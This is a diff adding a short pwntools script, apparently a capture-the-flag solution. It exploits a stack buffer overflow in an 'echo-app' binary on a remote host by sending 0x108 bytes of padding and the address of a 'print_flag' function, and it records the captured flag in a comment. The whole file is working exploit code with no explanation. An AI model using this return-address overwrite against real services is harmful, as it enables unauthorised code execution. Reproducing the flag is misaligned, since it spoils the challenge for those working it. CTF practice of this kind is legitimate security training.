@@ -1,0 +1,17 @@
+from pwn import *
+
+# bof
+
+p = remote("54.85.45.101", 8008)
+'''
+p = gdb.debug("./echo-app", gdbscript = 
+b *main
+)
+'''
+e = ELF("./echo-app")
+
+payload = b"A" * 0x108 + p64(e.symbols['print_flag'])
+p.sendline(payload)
+
+p.interactive()
+#flag{curs3d_are_y0ur_eyes_for_they_see_the_fl4g}
